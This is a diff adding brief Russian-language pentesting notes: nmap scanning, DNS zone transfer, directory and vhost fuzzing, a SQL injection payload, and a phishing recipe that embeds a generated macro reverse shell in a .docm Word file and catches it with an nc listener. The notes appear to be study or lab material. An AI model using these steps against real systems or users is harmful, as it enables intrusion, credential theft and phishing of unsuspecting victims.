@@ -1,0 +1,58 @@
+sudo nmap -sS -sV -sC -Pn (можно -p- и -sU) <сеть/маска> -vv --open
+
+## полезные порты -p21,22,25,80,443,53
+
+## 53 порт - dns, можно выгрузить все данные с dns конфига
+
+
+(dns zone trasfer explotation Linux)
+
+host -t axfr <домен> <ip>
+
+# словарь паролей rockyou.txt
+
+# обязательно юзать burpsuite для браузеров, полезно, т.к. он посредник
+(repeater, intruder, proxy и т.д.)
+
+/etc/resolf.conf
+
+dirsearch -u <url> --crawl
+cd /usr/share/wordLists/seclists
+seclists ls
+
+
+
+
+
+
+
+векторы в фишинг Microsoft
+самое ценное - макросы (код на определенном языке)
+полезная репа revshells.com
+
+macro_reverse_shell (в гугле код на питоне найти с гита)
+python3 generate.py <ip> <port>
+
+.docm расширение документа с макросами в ворде обычном (в макрос при создании просто сгенерированный код вставить)
+
+nc -nvlp <port>
+
+ffuf -u <url> -H <"Host: FUZZ.www и т.д."> -w /usr/share/wordlists/seclists/Discovery/DNS/ (дальше TAB) -mc 200
+
+
+
+sqlmap
+select <колонки> from <таблица> where <колонка>='Jack' or 1=1 #'
+
+
+
+
+
+
+
+
+
+
+
+
+
